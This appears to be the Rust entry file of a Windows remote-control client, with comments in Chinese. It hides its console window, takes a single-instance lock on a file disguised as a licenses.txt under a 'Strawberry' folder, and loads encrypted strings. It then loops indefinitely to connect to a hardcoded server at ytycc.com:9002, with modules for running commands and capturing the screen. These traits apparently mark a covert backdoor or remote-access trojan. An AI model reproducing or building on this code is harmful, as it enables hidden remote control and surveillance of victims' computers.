#![windows_subsystem = "windows"] //此宏不打开窗口，同时print也失效

use crate::context::Context;
use common::config::{Config, Id};
use common::file_util::get_dir_size;
use common::generated::encrypted_strings;
use log::debug;
use std::env;
use std::path::Path;
use std::time::Duration;
use tokio::fs::{File, OpenOptions};
use tokio::{join, time};

mod cmd_runner;
mod cmd_util;
mod context;
mod kik_conn;
mod kik_data_conn;
mod read_handle;
mod screen;

#[tokio::test]
async fn test() {
    use common::file_util;
    use common::time_util::{self, TimeUnit, Timer};
    use std::time::Duration;
    use time_util::*;
    // let start = Instant::now();
    // //8602103819
    // println!("{}", get_dir_size(r"D:\Myjava").await.unwrap());
    // println!("{:?}", start.elapsed());
    // println!("{:?}", ls("E:", false).await);
    let mut timer = Timer::new();
    println!("{}", file_util::get_dir_size(r"E:\D\").await.unwrap());
    println!("Elapsed time: {} ms", timer.elapsed(TimeUnit::Milliseconds));
}

#[tokio::main]
async fn main() {
    // env::set_var("RUST_LOG", "DEBUG");
    env_logger::init();
    //此lock在程序结束时会被操作系统回收，所以无需担心是否释放
    let _ = single("D:\\Strawberry\\licenses.txt").await;
    let context = Context::new();
    let config = Config {
        id: Id {
            username: "".to_string(),
            password: "".to_string(),
        },
        server_host: "ytycc.com".to_string(),
        server_port: "9002".to_string(),
        read_timeout: Duration::from_secs(45),
        write_timeout: Duration::from_secs(45),
    };

    loop {
        for _ in 0..3 {
            //校验成功了就返回
            match kik_conn::kik_conn(context.clone(), &config).await {
                Ok(h) => {
                    //加入服务器成功后发起数据连接
                    let (context, config) = (context.clone(), config.clone());
                    tokio::spawn(async move {
                        //校验成功就会返回
                        for _ in 0..3 {
                            match kik_data_conn::kik_data_conn(context.clone(), &config).await {
                                Ok(_) => {}
                                Err(e) => {
                                    debug!("{}", e);
                                    //todo 报告错误
                                }
                            }
                        }
                    });
                    join!(h);
                }
                Err(e) => {
                    debug!("{}", e);
                    time::sleep(Duration::from_secs(2)).await;
                    //todo
                }
            }
        }

        time::sleep(Duration::from_secs(20)).await;
    }
}

pub async fn single<P: AsRef<Path>>(lock_path: P) -> Option<File> {
    use fs4::tokio::AsyncFileExt;
    if !lock_path.as_ref().parent().unwrap().exists() {
        match tokio::fs::create_dir_all(lock_path.as_ref().parent().unwrap()).await {
            Ok(_) => {}
            Err(_) => {
                return None;
            }
        };
    }
    match OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(lock_path)
        .await
    {
        Ok(lock_file) => {
            let mut e_op = None;
            for _ in 0..3 {
                // 尝试获得文件锁
                match lock_file.try_lock_exclusive() {
                    Ok(_) => {
                        return Some(lock_file);
                    }
                    Err(e) => {
                        e_op = Some(e);
                    }
                }
                time::sleep(Duration::from_secs(3)).await;
            }
            if e_op.is_some() {
                println!("exist running");
                std::process::exit(0);
            } else {
                //神奇
                return None;
            }
        }
        Err(_) => {
            //文件创建失败的话放行
            return None;
        }
    };
}
